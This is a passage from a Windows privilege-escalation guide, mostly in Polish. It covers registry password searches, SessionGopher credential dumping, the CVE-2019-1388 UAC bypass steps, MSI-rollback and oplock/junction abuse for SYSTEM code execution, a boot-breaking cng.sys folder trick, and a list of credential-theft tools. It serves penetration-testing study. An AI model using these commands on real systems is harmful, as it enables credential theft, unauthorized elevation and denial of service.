REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Narzędzia wyszukujące passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **jest pluginem msf**. Stworzyłem ten plugin, aby **automatycznie uruchamiać każdy metasploit POST module, który wyszukuje credentials** na maszynie ofiary.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatycznie przeszukuje wszystkie pliki zawierające passwords wymienione na tej stronie.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) to kolejne świetne narzędzie do wydobywania passwords z systemu.

Narzędzie [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) wyszukuje **sessions**, **usernames** i **passwords** kilku narzędzi, które zapisują te dane w clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, i RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Wyobraź sobie, że **proces działający jako SYSTEM otwiera nowy proces** (`OpenProcess()`) z **pełnym dostępem**. Ten sam proces **tworzy również nowy proces** (`CreateProcess()`) **o niskich uprawnieniach, ale dziedziczący wszystkie otwarte uchwyty głównego procesu**.\
Wówczas, jeśli masz **pełny dostęp do procesu o niskich uprawnieniach**, możesz przechwycić **otwarty uchwyt do uprzywilejowanego procesu utworzonego** za pomocą `OpenProcess()` i **wstrzyknąć shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmenty pamięci współdzielonej, nazywane **pipes**, umożliwiają komunikację między procesami i transfer danych.

Windows udostępnia funkcję nazwaną **Named Pipes**, pozwalającą niespokrewnionym procesom na wymianę danych, nawet przez różne sieci. Przypomina to architekturę klient/serwer, gdzie role określone są jako **named pipe server** i **named pipe client**.

Gdy dane przesyłane są przez pipe przez **clienta**, **server**, który utworzył pipe, ma możliwość **przyjęcia tożsamości** **clienta**, pod warunkiem że posiada niezbędne prawa **SeImpersonate**. Znalezienie **uprzywilejowanego procesu**, który komunikuje się przez pipe, którego możesz udawać, daje możliwość **uzyskania wyższych uprawnień** poprzez przyjęcie tożsamości tego procesu, gdy wchodzi on w interakcję z pipe, który utworzyłeś. Instrukcje wykonania takiego ataku można znaleźć [**here**](named-pipe-client-impersonation.md) oraz [**here**](#from-high-integrity-to-system).

Dodatkowo następujące narzędzie pozwala **przechwycić komunikację named pipe za pomocą narzędzia takiego jak burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **a to narzędzie pozwala wylistować i zobaczyć wszystkie pipe'y, aby znaleźć privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Różne

### Rozszerzenia plików, które mogą wykonywać kod w Windows

Zobacz stronę **[https://filesec.io/](https://filesec.io/)**

### **Monitorowanie linii poleceń w poszukiwaniu haseł**

Kiedy uzyskasz shell jako użytkownik, mogą istnieć zadania zaplanowane lub inne procesy, które są wykonywane i **przekazują poświadczenia w linii poleceń**. Poniższy skrypt co dwie sekundy przechwytuje linie poleceń procesów i porównuje aktualny stan z poprzednim, wypisując wszelkie różnice.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Kradzież haseł z procesów

## Z konta o niskich uprawnieniach do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Jeśli masz dostęp do interfejsu graficznego (przez konsolę lub RDP) i UAC jest włączony, w niektórych wersjach Microsoft Windows możliwe jest uruchomienie terminala lub dowolnego innego procesu jako "NT\AUTHORITY SYSTEM" z konta nieuprzywilejowanego.

Pozwala to na eskalację uprawnień i jednoczesne obejście UAC przy użyciu tej samej luki. Dodatkowo nie ma potrzeby instalowania niczego, a używany podczas procesu plik binarny jest podpisany i wydany przez Microsoft.

Niektóre z dotkniętych systemów to:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Aby wykorzystać tę podatność, konieczne jest wykonanie następujących kroków:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## From Administrator Medium to High Integrity Level / UAC Bypass

Przeczytaj to, aby **dowiedzieć się o Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Następnie **przeczytaj to, aby dowiedzieć się o UAC i obejściach UAC:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

The attack basically consist of abusing the Windows Installer's rollback feature to replace legitimate files with malicious ones during the uninstallation process. For this the attacker needs to create a **malicious MSI installer** that will be used to hijack the `C:\Config.Msi` folder, which will later be used by he Windows Installer to store rollback files during the uninstallation of other MSI packages where the rollback files would have been modified to contain the malicious payload.

The summarized technique is the following:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Ten strumień przechowuje **metadane indeksu** folderu.

Zatem, jeśli **usuniesz strumień `::$INDEX_ALLOCATION`** folderu, NTFS **usunie cały folder** z systemu plików.

Możesz to zrobić, używając standardowych API do usuwania plików, takich jak:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Mimo że wywołujesz *file* delete API, ono **usuwa sam folder**.

### Od usuwania zawartości folderu do SYSTEM EoP
Co jeśli twój prymityw nie pozwala na usuwanie dowolnych plików/folderów, ale **pozwala na usunięcie *zawartości* folderu kontrolowanego przez atakującego**?

1. Krok 1: Utwórz pułapkowy folder i plik
- Utwórz: `C:\temp\folder1`
- W środku: `C:\temp\folder1\file1.txt`

2. Krok 2: Umieść **oplock** na `file1.txt`
- Ten oplock **wstrzymuje wykonanie**, gdy uprzywilejowany proces próbuje usunąć `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Krok 3: Wywołaj proces SYSTEM (np. `SilentCleanup`)
- Ten proces skanuje foldery (np. `%TEMP%`) i próbuje usunąć ich zawartość.
- Gdy dotrze do `file1.txt`, **oplock uruchamia się** i przekazuje kontrolę do twojego callbacka.

4. Krok 4: Wewnątrz callbacka oplocka – przekieruj usunięcie

- Opcja A: Przenieś `file1.txt` gdzie indziej
- To opróżnia `folder1` bez naruszenia oplocka.
- Nie usuwaj `file1.txt` bezpośrednio — to zwolniłoby oplock przedwcześnie.

- Opcja B: Konwertuj `folder1` na **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opcja C: Utwórz **symlink** w `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> To celuje w wewnętrzny strumień NTFS, który przechowuje metadane folderu — jego usunięcie powoduje usunięcie folderu.

5. Krok 5: Zwolnienie oplock
- Proces SYSTEM kontynuuje i próbuje usunąć `file1.txt`.
- Ale teraz, z powodu junction + symlink, w rzeczywistości usuwa:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Wynik**: `C:\Config.Msi` zostaje usunięty przez SYSTEM.

### Od Arbitrary Folder Create do trwałego DoS

Wykorzystaj prymityw, który pozwala ci **create an arbitrary folder as SYSTEM/admin** — nawet jeśli **nie możesz zapisywać plików** lub **ustawiać słabych uprawnień**.

Utwórz **folder** (nie plik) o nazwie **krytycznego sterownika Windows**, np.:
```
C:\Windows\System32\cng.sys
```
- Ta ścieżka zazwyczaj odpowiada sterownikowi trybu jądra `cng.sys`.
- Jeśli **wstępnie utworzysz ją jako folder**, Windows nie załaduje właściwego sterownika podczas rozruchu.
- Następnie Windows próbuje załadować `cng.sys` podczas rozruchu.
- Widząc folder, **nie udaje mu się odnaleźć właściwego sterownika**, i **zawiesza się lub zatrzymuje rozruch**.
- Nie ma **żadnego planu awaryjnego**, ani **możliwości odzyskania** bez zewnętrznej interwencji (np. naprawa rozruchu lub dostęp do dysku).


## **Z High Integrity do SYSTEM**

### **Nowa usługa**

Jeśli już działasz w procesie o High Integrity, **ścieżka do SYSTEM** może być prosta — wystarczy **utworzyć i uruchomić nową usługę**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Kiedy tworzysz plik binarny usługi, upewnij się, że to prawidłowa usługa lub że binarka wykona niezbędne czynności szybko, ponieważ jeśli nie będzie to prawidłowa usługa, zostanie zabita w 20s.

### AlwaysInstallElevated

Z procesu o High Integrity możesz spróbować **włączyć wpisy rejestru AlwaysInstallElevated** i **zainstalować** reverse shell używając _**.msi**_ wrappera.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Jeśli posiadasz te uprawnienia tokena (prawdopodobnie znajdziesz je w procesie już o High Integrity), będziesz w stanie **otworzyć prawie dowolny proces** (nie dotyczy procesów chronionych) z uprawnieniem SeDebug, **skopiować token** procesu i utworzyć **dowolny proces z tym tokenem**.\
Zwykle w tej technice **wybiera się proces uruchomiony jako SYSTEM posiadający wszystkie uprawnienia tokena** (_tak, możesz znaleźć procesy SYSTEM bez wszystkich uprawnień tokena_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Technika ta jest używana przez meterpreter do eskalacji w `getsystem`. Polega na **utworzeniu pipe i następnie utworzeniu/wykorzystaniu usługi do zapisu w tym pipe**. Następnie **serwer**, który utworzył pipe używając uprawnienia **`SeImpersonate`**, będzie w stanie **podszyć się pod token** klienta pipe (usługi), uzyskując uprawnienia SYSTEM.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Jeśli uda ci się **hijackować dll** ładowaną przez **proces** uruchomiony jako **SYSTEM**, będziesz w stanie wykonać dowolny kod z tymi uprawnieniami. Dlatego Dll Hijacking jest przydatny do tego typu eskalacji uprawnień, a co więcej, znacznie **łatwiejszy do osiągnięcia z procesu o wysokiej integralności**, ponieważ będzie miał **uprawnienia zapisu** w folderach używanych do ładowania dll.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Więcej pomocy

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Przydatne narzędzia

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Sprawdza błędne konfiguracje i poufne pliki (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Sprawdza możliwe błędne konfiguracje i zbiera informacje (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Sprawdza błędne konfiguracje**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Ekstrahuje zapisane sesje PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Użyj -Thorough lokalnie.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Ekstrahuje poświadczenia z Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Przeprowadza spray z zebranymi hasłami w domenie**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh to PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer i narzędzie man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Podstawowa enumeracja Windows pod kątem privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Wyszukuje znane podatności privesc (NIEAKTUALNE dla Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne sprawdzenia **(Wymaga uprawnień Administratora)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Wyszukuje znane podatności privesc (wymaga skompilowania przy użyciu VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeruje hosta w poszukiwaniu błędnych konfiguracji (bardziej narzędzie do zbierania informacji niż privesc) (wymaga skompilowania) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Ekstrahuje poświadczenia z wielu programów (precompiled exe na GitHubie)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp do C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Sprawdza błędne konfiguracje (wykonywalny precompiled na GitHubie). Niezalecane. Nie działa dobrze w Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Sprawdza możliwe błędne konfiguracje (exe z pythona). Niezalecane. Nie działa dobrze w Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Narzędzie stworzone na podstawie tego posta (nie wymaga accesschk do poprawnego działania, ale może go użyć).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Odczytuje wynik **systeminfo** i rekomenduje działające exploity (lokalny python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Odczytuje wynik **systeminfo** i rekomenduje działające exploity (lokalny python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Musisz skompilować projekt używając odpowiedniej wersji .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Aby zobaczyć zainstalowaną wersję .NET na hoście ofiary możesz zrobić:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Referencje

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
